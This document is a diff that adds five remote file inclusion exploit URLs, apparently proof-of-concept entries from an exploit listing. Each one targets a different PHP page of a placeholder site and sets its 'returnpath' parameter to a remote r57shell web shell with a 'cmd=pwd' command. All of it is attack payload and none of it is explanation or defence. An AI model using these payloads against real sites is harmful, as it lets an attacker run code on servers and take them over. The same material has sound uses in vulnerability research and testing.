@@ -1,0 +1,5 @@
+http://www.example.com/help.php?returnpath=http://www.example.com/download/r57shell.txt?&amp;cmd=pwd
+http://www.example.com/newlist.php?returnpath=http://www.example.com/download/r57shell.txt?&amp;cmd=pwd
+http://www.example.com/confirm.php?returnpath=http://www.example.com/download/r57shell.txt?&amp;cmd=pwd
+http://www.example.com/list.php?returnpath=http://www.example.com/download/r57shell.txt?&amp;cmd=pwd
+http://www.example.com/marathon/out.php?returnpath=http://www.example.com/download/r57shell.txt?&amp;cmd=pwd
